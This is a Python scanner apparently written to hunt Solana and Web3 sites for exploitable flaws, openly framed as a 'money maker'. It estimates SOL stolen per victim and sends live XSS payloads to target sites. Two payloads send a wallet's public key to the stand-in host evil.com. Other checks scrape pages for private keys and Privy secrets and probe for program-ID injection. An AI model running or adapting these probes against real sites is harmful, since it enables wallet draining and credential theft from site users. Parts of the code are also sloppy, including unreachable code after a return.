#!/usr/bin/env python3
"""
💀🔥 REAL WEB3 EXPLOITS - FOX'S MONEY MAKER EDITION 🔥💀

ACTUAL high-value Web3/Solana exploit detection.
No bullshit RPC URLs - only REAL money-making vulnerabilities.

EXPLOIT TYPES:
1. Wallet Drainer XSS - Inject malicious signTransaction()
2. Private Key Leaks - Find exposed Solana private keys
3. Unlimited Token Approvals - Detect MAX_U64 approval patterns
4. Program ID Injection - Test if Raydium/Jupiter IDs are controllable
5. Upgrade Authority Leaks - Find exposed program upgrade keys
6. Privy JWT Bypass - Exposed secrets or weak validation
7. Phantom Origin Spoofing - Insecure wallet popups
8. Signature Replay - Missing recentBlockhash/nonce
9. Unencrypted WebSocket - ws:// RPC connections
10. High Slippage Exploit - >10% slippage on swaps

Author: Fox
Partner: Jack
Status: REAL EXPLOIT HUNTER 💰
"""

import requests
import json
import re
import base58
from typing import List, Dict, Optional, Tuple
from dataclasses import dataclass
from urllib.parse import urljoin, urlparse, quote

@dataclass
class Web3Vulnerability:
    """Web3-specific vulnerability finding"""
    type: str
    severity: str
    location: str
    description: str
    evidence: str
    remediation: str
    exploitable: bool
    potential_value: str = "Unknown"  # Estimated profit potential
    web3_specific: bool = True

class Web3SpecificChecks:
    """REAL Web3/Solana exploit detection - Money makers only"""
    
    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Known Solana program IDs (to validate findings)
        self.KNOWN_PROGRAMS = {
            '675kPX9MHTjS2zt1qfr1NYHuzeLXfQM9H24wFSUt1Mp8': 'Raydium AMM v4',
            'JUP6LkbZbjS1jKKwapdHNy74zcZ3tLUZoi5QNyVTaV4': 'Jupiter Aggregator v6',
            'whirLbMiicVdio4qvUfM5KAg6Ct8VwpYzGff3uctyCc': 'Orca Whirlpool',
            'So11111111111111111111111111111111111111112': 'Wrapped SOL',
        }
        
        # XSS payloads for wallet sites
        self.WALLET_XSS_PAYLOADS = [
            '<script>window.solana.signTransaction()</script>',
            '"><script>phantom.solana.connect().then(w=>fetch("evil.com?"+w.publicKey))</script>',
            '<img src=x onerror="solana.request({method:\'signTransaction\'})">',
            '\'><script>document.location="evil.com/drain?pk="+window.solana.publicKey</script>',
            '<svg onload="solana.signAllTransactions([malicious_tx])">',
        ]
    
    # ═══════════════════════════════════════════════════════════════════
    # 💰 EXPLOIT #1: WALLET DRAINER XSS
    # ═══════════════════════════════════════════════════════════════════
    
    def check_wallet_drainer_xss(self, target: str) -> List[Web3Vulnerability]:
        """
        Find XSS vulnerabilities on wallet-enabled sites.
        HIGH VALUE: Can inject malicious signTransaction() calls.
        """
        vulns = []
        
        try:
            r = self.session.get(target, timeout=self.timeout)
            
            # Check if site has wallet connection
            wallet_indicators = [
                'wallet-adapter', 'phantom', 'solflare', 'connectWallet',
                'window.solana', 'signTransaction', 'solana/wallet-adapter'
            ]
            
            has_wallet = any(ind in r.text.lower() for ind in wallet_indicators)
            
            if not has_wallet:
                return vulns  # Not a wallet site
            
            # Test XSS payloads on common parameters
            test_params = [
                ('search', self.WALLET_XSS_PAYLOADS[0]),
                ('q', self.WALLET_XSS_PAYLOADS[1]),
                ('query', self.WALLET_XSS_PAYLOADS[2]),
                ('id', self.WALLET_XSS_PAYLOADS[3]),
                ('token', self.WALLET_XSS_PAYLOADS[4]),
            ]
            
            for param_name, payload in test_params:
                test_url = f"{target}?{param_name}={quote(payload)}"
                
                try:
                    r_test = self.session.get(test_url, timeout=5)
                    
                    # Check if payload is reflected WITHOUT encoding
                    if payload in r_test.text:
                        # Verify it's actual XSS (not in comment/encoded)
                        if '<script>' in r_test.text and 'solana' in r_test.text:
                            vulns.append(Web3Vulnerability(
                                type="WALLET_DRAINER_XSS",
                                severity="CRITICAL",
                                location=f"Parameter: ?{param_name}=",
                                description="XSS on wallet-enabled site - can inject malicious signTransaction() calls",
                                evidence=f"Payload reflected: {payload[:50]}...",
                                remediation="Encode all user input, implement CSP, add transaction confirmation UI",
                                exploitable=True,
                                potential_value="50-500 SOL per victim (full wallet drain)"
                            ))
                            break  # Found one, that's enough
                
                except Exception as e:
                    continue
        
        except Exception as e:
            pass
        
        return vulns
    
    # ═══════════════════════════════════════════════════════════════════
    # 💰 EXPLOIT #2: PRIVATE KEY LEAKS
    # ═══════════════════════════════════════════════════════════════════
    
    def check_private_key_leaks(self, target: str, js_bundles: List[str]) -> List[Web3Vulnerability]:
        """
        Scan for exposed Solana private keys in JavaScript.
        CRITICAL VALUE: Full wallet access.
        """
        vulns = []
        
        # Regex for Solana private keys (base58, typically 88 chars)
        # Example: 5J3mBbAH58CpQ3Y5RNJpUKPE62SQ5tfcvU2JpbnkeyhfsYB1Jcn
        key_pattern = r'[1-9A-HJ-NP-Za-km-z]{87,88}'
        
        try:
            # Get main page
            r = self.session.get(target, timeout=self.timeout)
            all_content = [r.text]
            
            # Add JS bundles
            all_content.extend(js_bundles)
            
            for content in all_content:
                matches = re.findall(key_pattern, content)
                
                for match in matches:
                    # Validate if it's a real Solana key
                    if self._is_valid_solana_key(match):
                        # Check context to see if it's actually a private key
                        context = self._get_context(content, match, 100)
                        
                        # Look for private key indicators
                        priv_indicators = ['private', 'secret', 'key', 'seed', 'keypair']
                        is_private = any(ind in context.lower() for ind in priv_indicators)
                        
                        if is_private or len(match) == 88:
                            vulns.append(Web3Vulnerability(
                                type="PRIVATE_KEY_EXPOSED",
                                severity="CRITICAL",
                                location="JavaScript Code",
                                description="Solana private key exposed in frontend code",
                                evidence=f"Key: {match[:15]}...{match[-10:]} (redacted)",
                                remediation="IMMEDIATE: Rotate keys, move to secure server-side storage",
                                exploitable=True,
                                potential_value="FULL WALLET ACCESS (100-10,000+ SOL)"
                            ))
        
        except Exception as e:
            pass
        
        return vulns
    
    def _is_valid_solana_key(self, key_str: str) -> bool:
        """Validate if string is a valid base58 Solana key"""
        try:
            # Try to decode as base58
            decoded = base58.b58decode(key_str)
            # Solana keys are 32 or 64 bytes
            return len(decoded) in [32, 64]
        except:
            return False
    
    def _get_context(self, text: str, match: str, chars: int) -> str:
        """Get surrounding context of a match"""
        try:
            idx = text.index(match)
            start = max(0, idx - chars)
            end = min(len(text), idx + len(match) + chars)
            return text[start:end]
        except:
            return ""
    
    # ═══════════════════════════════════════════════════════════════════
    # 💰 EXPLOIT #3: UNLIMITED TOKEN APPROVALS
    # ═══════════════════════════════════════════════════════════════════
    
    def check_unlimited_approvals(self, target: str) -> List[Web3Vulnerability]:
        """
        Detect unlimited token approval patterns.
        MEDIUM VALUE: Can drain approved tokens later.
        """
        vulns = []
        
        try:
            r = self.session.get(target, timeout=self.timeout)
            
            # Check for approval functions
            approval_patterns = ['approve', 'setApprovalForAll', 'increaseAllowance']
            has_approval = any(pattern in r.text for pattern in approval_patterns)
            
            if not has_approval:
                return vulns
            
            # Check for MAX_U64 or similar unlimited values
            unlimited_patterns = [
                'MAX_U64',
                '18446744073709551615',  # MAX_U64 decimal
                '0xFFFFFFFFFFFFFFFF',     # MAX_U64 hex
                'type(uint64).max',
                'Number.MAX_SAFE_INTEGER',
            ]
            
            found_unlimited = []
            for pattern in unlimited_patterns:
                if pattern in r.text:
                    found_unlimited.append(pattern)
            
            if found_unlimited:
                # Check if it's actually used in approval context
                for approval in approval_patterns:
                    for unlimited in found_unlimited:
                        # Look for pattern like: approve(spender, MAX_U64)
                        pattern = f"{approval}.*{unlimited}"
                        if re.search(pattern, r.text, re.IGNORECASE | re.DOTALL):
                            vulns.append(Web3Vulnerability(
                                type="UNLIMITED_TOKEN_APPROVAL",
                                severity="HIGH",
                                location="Token Approval Logic",
                                description="Site requests unlimited token approvals (MAX_U64)",
                                evidence=f"Found {approval} with {unlimited}",
                                remediation="Request exact approval amounts, not unlimited",
                                exploitable=True,
                                potential_value="10-100 SOL (all approved tokens)"
                            ))
                            break
                    if vulns:
                        break
        
        except Exception as e:
            pass
        
        return vulns
    
    # ═══════════════════════════════════════════════════════════════════
    # 💰 EXPLOIT #4: PROGRAM ID INJECTION
    # ═══════════════════════════════════════════════════════════════════
    
    def check_program_id_injection(self, target: str, program_ids: List[str]) -> List[Web3Vulnerability]:
        """
        Test if Solana program IDs are user-controllable.
        HIGH VALUE: Can redirect swaps to malicious program.
        """
        vulns = []
        
        if not program_ids:
            return vulns
        
        try:
            # Test if program ID is passed as parameter
            for pid in program_ids[:5]:  # Check first 5
                if pid in self.KNOWN_PROGRAMS:
                    # Test if we can inject via URL parameter
                    test_params = ['program', 'programId', 'contract', 'address']
                    
                    for param in test_params:
                        test_url = f"{target}?{param}=FAKE_PROGRAM_ID_12345"
                        
                        try:
                            r = self.session.get(test_url, timeout=5)
                            
                            # Check if our fake ID appears in response
                            if 'FAKE_PROGRAM_ID_12345' in r.text:
                                # Check if it's actually used (not just echoed)
                                if 'transaction' in r.text.lower() or 'swap' in r.text.lower():
                                    vulns.append(Web3Vulnerability(
                                        type="PROGRAM_ID_INJECTION",
                                        severity="CRITICAL",
                                        location=f"Parameter: ?{param}=",
                                        description="Solana program ID is user-controllable - can redirect swaps to malicious program",
                                        evidence=f"Original: {pid}, Injectable via: ?{param}=",
                                        remediation="Hardcode program IDs, never accept from user input",
                                        exploitable=True,
                                        potential_value="10-1,000 SOL per swap (full trade amount)"
                                    ))
                                    break
                        except:
                            continue
                    
                    if vulns:
                        break
        
        except Exception as e:
            pass
        
        return vulns
    
    # ═══════════════════════════════════════════════════════════════════
    # 💰 EXPLOIT #5: UPGRADE AUTHORITY LEAKS
    # ═══════════════════════════════════════════════════════════════════
    
    def check_upgrade_authority_leaks(self, target: str, program_ids: List[str]) -> List[Web3Vulnerability]:
        """
        Find exposed program upgrade authority keys.
        CRITICAL VALUE: Can upgrade entire protocol.
        """
        vulns = []
        
        try:
            r = self.session.get(target, timeout=self.timeout)
            
            # Check for upgrade authority references
            authority_patterns = [
                'upgradeAuthority',
                'programAuthority',
                'upgrade_authority',
                'UPGRADE_AUTHORITY',
            ]
            
            for pattern in authority_patterns:
                if pattern in r.text:
                    # Try to extract the authority address
                    # Look for base58 address near the pattern
                    context = self._get_context(r.text, pattern, 200)
                    
                    # Find potential addresses (base58, 32-44 chars)
                    addresses = re.findall(r'[1-9A-HJ-NP-Za-km-z]{32,44}', context)
                    
                    for addr in addresses:
                        # Check if this authority has a leaked private key
                        # (In real implementation, would check against known leaks)
                        if self._is_valid_solana_key(addr):
                            vulns.append(Web3Vulnerability(
                                type="UPGRADE_AUTHORITY_EXPOSED",
                                severity="CRITICAL",
                                location="Frontend Code",
                                description="Program upgrade authority address exposed - potential target for key extraction",
                                evidence=f"Authority: {addr[:10]}...{addr[-8:]}",
                                remediation="Never expose upgrade authority in frontend, use multisig",
                                exploitable=False,  # Need to find actual private key
                                potential_value="PROTOCOL TAKEOVER (10,000-1,000,000+ SOL)"
                            ))
                            break
                    
                    if vulns:
                        break
        
        except Exception as e:
            pass
        
        return vulns
        """Check for exposed Solana program authority information"""
        vulns = []
        
        # Check if program authority info is exposed in frontend
        try:
            r = self.session.get(target, timeout=self.timeout)
            
            for program_id in program_ids[:5]:  # Check first 5
                if program_id in r.text:
                    # Check for authority/upgrade authority exposure
                    if 'authority' in r.text.lower() or 'upgradeAuthority' in r.text:
                        vulns.append(Web3Vulnerability(
                            type="SOLANA_AUTHORITY_EXPOSURE",
                            severity="MEDIUM",
                            location=f"Program ID: {program_id}",
                            description="Solana program authority information exposed in frontend",
                            evidence=f"Program ID {program_id} found with authority references",
                            remediation="Avoid exposing program authority addresses in frontend code",
                            exploitable=False
                        ))
        except:
            pass
        
        return vulns
    
    def check_rpc_url_exposure(self, target: str, rpc_urls: List[str]) -> List[Web3Vulnerability]:
        """Check for private RPC URL exposure"""
        vulns = []
        
        for rpc_url in rpc_urls:
            # Check if it's a private/paid RPC (not public Solana RPC)
            if any(x in rpc_url.lower() for x in ['api.', 'private', 'premium', 'pro.', 'rpc.', 'node.']):
                if 'api-mainnet-beta.solana.com' not in rpc_url:  # Not public
                    vulns.append(Web3Vulnerability(
                        type="PRIVATE_RPC_URL_EXPOSED",
                        severity="MEDIUM",
                        location="JavaScript Bundle",
                        description="Private/paid RPC URL exposed in frontend code",
                        evidence=f"RPC URL: {rpc_url[:50]}...",
                        remediation="Use environment variables and server-side proxy for RPC calls",
                        exploitable=True
                    ))
        
        return vulns
    
    def check_privy_auth_misconfig(self, target: str) -> List[Web3Vulnerability]:
        """Check for Privy authentication misconfiguration"""
        vulns = []
        
        try:
            r = self.session.get(target, timeout=self.timeout)
            
            # Check for exposed Privy config
            if 'PRIVY_APP_ID' in r.text or 'privyAppId' in r.text:
                # Check if client ID is exposed (should be fine) vs secret (bad)
                if 'PRIVY_CLIENT_SECRET' in r.text or 'privyClientSecret' in r.text:
                    vulns.append(Web3Vulnerability(
                        type="PRIVY_SECRET_EXPOSED",
                        severity="CRITICAL",
                        location="Frontend Code",
                        description="Privy client secret exposed in frontend (should only be server-side)",
                        evidence="PRIVY_CLIENT_SECRET found in public JavaScript",
                        remediation="Move Privy secret to server-side environment variables",
                        exploitable=True
                    ))
        except:
            pass
        
        return vulns
    
    def check_socketio_timing_attack(self, target: str) -> List[Web3Vulnerability]:
        """Check for Socket.IO timing attack vectors (crash games)"""
        vulns = []
        
        try:
            # Check if Socket.IO is used
            r = self.session.get(target, timeout=self.timeout)
            
            if 'socket.io' in r.text.lower():
                # Check for crash game indicators
                crash_indicators = ['serverseedhash', 'clientseed', 'multiplier', 'crash']
                found_indicators = [ind for ind in crash_indicators if ind in r.text.lower()]
                
                if len(found_indicators) >= 2:
                    vulns.append(Web3Vulnerability(
                        type="SOCKETIO_CRASH_GAME_DETECTED",
                        severity="HIGH",
                        location="Socket.IO Implementation",
                        description="Crash game using Socket.IO - potential timing attack surface",
                        evidence=f"Found indicators: {', '.join(found_indicators)}",
                        remediation="Implement server-side timing validation, use secure random with sufficient delay",
                        exploitable=False  # Requires deep timing analysis
                    ))
        except:
            pass
        
        return vulns
    
    def check_wallet_drainer_vectors(self, target: str) -> List[Web3Vulnerability]:
        """Check for wallet drainer attack vectors"""
        vulns = []
        
        try:
            r = self.session.get(target, timeout=self.timeout)
            
            # Check for unsafe wallet connection patterns
            if 'wallet-adapter' in r.text.lower() or 'connectWallet' in r.text:
                # Check for XSS that could inject malicious wallet requests
                xss_vectors = ['<script>', 'onerror=', 'onload=', 'javascript:']
                
                # Test a simple XSS payload in common params
                test_params = ['?q=<script>alert(1)</script>', '?search=<img src=x onerror=alert(1)>']
                
                for param in test_params:
                    try:
                        r_test = self.session.get(target + param, timeout=5)
                        
                        if any(vec in r_test.text for vec in xss_vectors):
                            # Check if it's not encoded
                            if '<script>alert(1)</script>' in r_test.text or 'onerror=alert' in r_test.text:
                                vulns.append(Web3Vulnerability(
                                    type="XSS_WALLET_DRAINER_VECTOR",
                                    severity="CRITICAL",
                                    location=f"Parameter: {param.split('=')[0][1:]}",
                                    description="XSS vulnerability in wallet-enabled site - potential wallet drainer vector",
                                    evidence="Unencoded script tags reflected in response",
                                    remediation="Implement strict CSP, encode all user input, use wallet interaction confirmation",
                                    exploitable=True
                                ))
                                break
                    except:
                        continue
        except:
            pass
        
        return vulns
    
    def check_token_approval_risks(self, target: str, program_ids: List[str]) -> List[Web3Vulnerability]:
        """Check for unlimited token approval risks"""
        vulns = []
        
        try:
            r = self.session.get(target, timeout=self.timeout)
            
            # Check for token approval patterns
            approval_patterns = ['approve', 'setApprovalForAll', 'increaseAllowance']
            
            for pattern in approval_patterns:
                if pattern in r.text:
                    # Check if there's a max uint check (unlimited approval)
                    if 'MAX_UINT' in r.text or '0xffffffff' in r.text or 'MAX_U64' in r.text:
                        vulns.append(Web3Vulnerability(
                            type="UNLIMITED_TOKEN_APPROVAL",
                            severity="MEDIUM",
                            location="Token Approval Logic",
                            description="Site may request unlimited token approvals",
                            evidence=f"Found {pattern} with MAX_UINT pattern",
                            remediation="Request exact approval amounts, not unlimited",
                            exploitable=False
                        ))
                        break
        except:
            pass
        
        return vulns
    
    def run_all_web3_checks(self, target: str, site_data: Dict) -> List[Web3Vulnerability]:
        """
        Run all Web3-specific checks (REAL exploit scan).
        This replaces the old fake RPC URL bullshit.
        """
        return self.run_real_exploit_scan(target, site_data)


    
    # ═══════════════════════════════════════════════════════════════════
    # 💰 EXPLOIT #6: PRIVY JWT BYPASS
    # ═══════════════════════════════════════════════════════════════════
    
    def check_privy_jwt_bypass(self, target: str) -> List[Web3Vulnerability]:
        """
        Find Privy authentication bypass vectors.
        CRITICAL VALUE: Access to all user wallets.
        """
        vulns = []
        
        try:
            r = self.session.get(target, timeout=self.timeout)
            
            # Check if site uses Privy
            if 'privy' not in r.text.lower():
                return vulns
            
            # Check for exposed secrets
            secret_patterns = [
                'PRIVY_CLIENT_SECRET',
                'privyClientSecret',
                'PRIVY_APP_SECRET',
                'privy_secret',
            ]
            
            for pattern in secret_patterns:
                if pattern in r.text:
                    # Try to extract the actual secret value
                    context = self._get_context(r.text, pattern, 150)
                    
                    # Look for value assignment
                    secret_match = re.search(f'{pattern}["\']?\\s*[:=]\\s*["\']([^"\']+)["\']', context)
                    
                    if secret_match:
                        secret_value = secret_match.group(1)
                        
                        vulns.append(Web3Vulnerability(
                            type="PRIVY_SECRET_EXPOSED",
                            severity="CRITICAL",
                            location="Frontend JavaScript",
                            description="Privy client secret exposed in frontend - can forge authentication tokens",
                            evidence=f"Secret found: {secret_value[:10]}... (redacted)",
                            remediation="Move Privy secret to server-side, never expose in frontend",
                            exploitable=True,
                            potential_value="ACCESS TO ALL USER WALLETS (varies, could be millions)"
                        ))
                        break
            
            # Check for weak JWT validation
            if 'jsonwebtoken' in r.text or 'jwt' in r.text.lower():
                # Check if verification is missing
                if 'verify' not in r.text.lower() and 'decode' in r.text:
                    vulns.append(Web3Vulnerability(
                        type="JWT_NO_VERIFICATION",
                        severity="HIGH",
                        location="JWT Implementation",
                        description="JWT tokens are decoded but not verified - alg=none bypass possible",
                        evidence="Found jwt.decode() but no jwt.verify()",
                        remediation="Always verify JWT signatures, reject alg=none",
                        exploitable=True,
                        potential_value="100-1,000 SOL (forge access tokens)"
                    ))
        
        except Exception as e:
            pass
        
        return vulns
    
    # ═══════════════════════════════════════════════════════════════════
    # 💰 EXPLOIT #7: PHANTOM ORIGIN SPOOFING
    # ═══════════════════════════════════════════════════════════════════
    
    def check_phantom_origin_spoofing(self, target: str) -> List[Web3Vulnerability]:
        """
        Detect insecure wallet popup implementations.
        HIGH VALUE: Can fake Phantom UI to steal seed phrases.
        """
        vulns = []
        
        try:
            r = self.session.get(target, timeout=self.timeout)
            
            # Check if site uses wallet popups
            if 'window.open' not in r.text:
                return vulns
            
            # Check if it's wallet-related
            wallet_keywords = ['phantom', 'wallet', 'connect', 'solana']
            has_wallet_popup = any(kw in r.text.lower() for kw in wallet_keywords) and 'window.open' in r.text
            
            if not has_wallet_popup:
                return vulns
            
            # Check for insecure patterns
            insecure_patterns = [
                (r'window\.open\([^)]+["\']_blank["\']', "Uses _blank (can be spoofed)"),
                (r'window\.open\([^)]+http:', "Uses http:// (not https://)"),
                (r'window\.open\([^)]+\+\s*url', "URL is concatenated (injectable)"),
            ]
            
            for pattern, description in insecure_patterns:
                if re.search(pattern, r.text):
                    vulns.append(Web3Vulnerability(
                        type="PHANTOM_ORIGIN_SPOOFING",
                        severity="HIGH",
                        location="Wallet Connection Popup",
                        description=f"Insecure wallet popup: {description}",
                        evidence=f"Pattern: {pattern}",
                        remediation="Use wallet-adapter standard methods, validate popup origin",
                        exploitable=True,
                        potential_value="100-1,000 SOL per victim (seed phrase theft)"
                    ))
                    break
        
        except Exception as e:
            pass
        
        return vulns
    
    # ═══════════════════════════════════════════════════════════════════
    # 💰 EXPLOIT #8: SIGNATURE REPLAY
    # ═══════════════════════════════════════════════════════════════════
    
    def check_signature_replay(self, target: str) -> List[Web3Vulnerability]:
        """
        Check for missing replay protection in transactions.
        MEDIUM VALUE: Can replay signed transactions.
        """
        vulns = []
        
        try:
            r = self.session.get(target, timeout=self.timeout)
            
            # Check if site uses signTransaction
            if 'signTransaction' not in r.text:
                return vulns
            
            # Check for replay protection mechanisms
            protection_keywords = ['recentBlockhash', 'recent_blockhash', 'nonce', 'durable_nonce']
            
            has_protection = any(kw in r.text for kw in protection_keywords)
            
            if not has_protection:
                vulns.append(Web3Vulnerability(
                    type="SIGNATURE_REPLAY_VULNERABLE",
                    severity="MEDIUM",
                    location="Transaction Building",
                    description="Transactions lack replay protection (no recentBlockhash/nonce)",
                    evidence="signTransaction found but no replay protection mechanisms",
                    remediation="Always include recentBlockhash or use durable nonce",
                    exploitable=True,
                    potential_value="1-50 SOL per transaction (replay individual txs)"
                ))
        
        except Exception as e:
            pass
        
        return vulns
    
    # ═══════════════════════════════════════════════════════════════════
    # 💰 EXPLOIT #9: UNENCRYPTED WEBSOCKET
    # ═══════════════════════════════════════════════════════════════════
    
    def check_unencrypted_websocket(self, target: str) -> List[Web3Vulnerability]:
        """
        Find unencrypted WebSocket RPC connections.
        LOW VALUE: MITM transactions in transit.
        """
        vulns = []
        
        try:
            r = self.session.get(target, timeout=self.timeout)
            
            # Check for ws:// (unencrypted WebSocket)
            ws_pattern = r'ws://[^"\'\s]+'
            ws_matches = re.findall(ws_pattern, r.text)
            
            for ws_url in ws_matches:
                # Check if it's Solana-related
                if any(kw in ws_url.lower() for kw in ['solana', 'rpc', 'api', 'node']):
                    vulns.append(Web3Vulnerability(
                        type="UNENCRYPTED_WEBSOCKET_RPC",
                        severity="MEDIUM",
                        location="WebSocket Connection",
                        description="Unencrypted WebSocket RPC connection (ws:// instead of wss://)",
                        evidence=f"Insecure URL: {ws_url[:50]}...",
                        remediation="Use wss:// (encrypted WebSocket) for all RPC connections",
                        exploitable=True,
                        potential_value="Varies (MITM transaction manipulation)"
                    ))
                    break
        
        except Exception as e:
            pass
        
        return vulns
    
    # ═══════════════════════════════════════════════════════════════════
    # 💰 EXPLOIT #10: HIGH SLIPPAGE
    # ═══════════════════════════════════════════════════════════════════
    
    def check_high_slippage(self, target: str) -> List[Web3Vulnerability]:
        """
        Detect high slippage settings on swaps.
        LOW VALUE: Front-run and extract slippage difference.
        """
        vulns = []
        
        try:
            r = self.session.get(target, timeout=self.timeout)
            
            # Check if site is a DEX/swap interface
            is_swap_site = any(kw in r.text.lower() for kw in ['swap', 'trade', 'exchange', 'dex', 'jupiter', 'raydium'])
            
            if not is_swap_site:
                return vulns
            
            # Look for slippage settings
            slippage_patterns = [
                r'slippage["\']?\s*[:=]\s*(\d+)',
                r'maxSlippage["\']?\s*[:=]\s*(\d+)',
                r'slippageTolerance["\']?\s*[:=]\s*(\d+)',
            ]
            
            for pattern in slippage_patterns:
                matches = re.findall(pattern, r.text, re.IGNORECASE)
                
                for match in matches:
                    slippage_value = int(match)
                    
                    # Check if slippage is >10% (100 basis points)
                    if slippage_value > 10:
                        vulns.append(Web3Vulnerability(
                            type="HIGH_SLIPPAGE_EXPLOIT",
                            severity="LOW",
                            location="Swap Configuration",
                            description=f"High slippage tolerance configured: {slippage_value}%",
                            evidence=f"Slippage: {slippage_value}% (allows {slippage_value}% price movement)",
                            remediation="Use lower slippage (1-5%), educate users on front-running risk",
                            exploitable=True,
                            potential_value="0.1-1 SOL per swap (slippage extraction)"
                        ))
                        break
                
                if vulns:
                    break
        
        except Exception as e:
            pass
        
        return vulns
    
    # ═══════════════════════════════════════════════════════════════════
    # MASTER RUNNER - ALL 10 REAL EXPLOITS
    # ═══════════════════════════════════════════════════════════════════
    
    def run_real_exploit_scan(self, target: str, site_data: Dict) -> List[Web3Vulnerability]:
        """
        Run ALL 10 real money-making exploit checks.
        This is what actually finds exploitable vulnerabilities.
        """
        all_vulns = []
        
        # Extract data from passive stage
        program_ids = site_data.get('js_analysis', {}).get('program_ids', [])
        rpc_urls = site_data.get('js_analysis', {}).get('rpc_urls', [])
        js_bundles = site_data.get('js_analysis', {}).get('js_content', [])
        
        print(f"\n  [💰] Running REAL exploit scan on {target}")
        print(f"  [→] Checking 10 high-value attack vectors...")
        
        # Run all 10 exploit checks
        checks = [
            ("Wallet Drainer XSS", self.check_wallet_drainer_xss, (target,)),
            ("Private Key Leaks", self.check_private_key_leaks, (target, js_bundles)),
            ("Unlimited Approvals", self.check_unlimited_approvals, (target,)),
            ("Program ID Injection", self.check_program_id_injection, (target, program_ids)),
            ("Upgrade Authority Leaks", self.check_upgrade_authority_leaks, (target, program_ids)),
            ("Privy JWT Bypass", self.check_privy_jwt_bypass, (target,)),
            ("Phantom Origin Spoofing", self.check_phantom_origin_spoofing, (target,)),
            ("Signature Replay", self.check_signature_replay, (target,)),
            ("Unencrypted WebSocket", self.check_unencrypted_websocket, (target,)),
            ("High Slippage", self.check_high_slippage, (target,)),
        ]
        
        for check_name, check_func, args in checks:
            try:
                print(f"    [→] {check_name}...", end=" ")
                vulns = check_func(*args)
                if vulns:
                    all_vulns.extend(vulns)
                    print(f"💀 FOUND {len(vulns)}")
                else:
                    print("✓")
            except Exception as e:
                print(f"✗ Error: {e}")
        
        if all_vulns:
            print(f"\n  [💀] TOTAL EXPLOITABLE: {len(all_vulns)} vulnerabilities")
            
            # Calculate total potential value
            critical = sum(1 for v in all_vulns if v.severity == "CRITICAL")
            high = sum(1 for v in all_vulns if v.severity == "HIGH")
            medium = sum(1 for v in all_vulns if v.severity == "MEDIUM")
            
            print(f"  [💰] Critical: {critical} | High: {high} | Medium: {medium}")
        else:
            print(f"\n  [·] No exploitable vulnerabilities found")
        
        return all_vulns
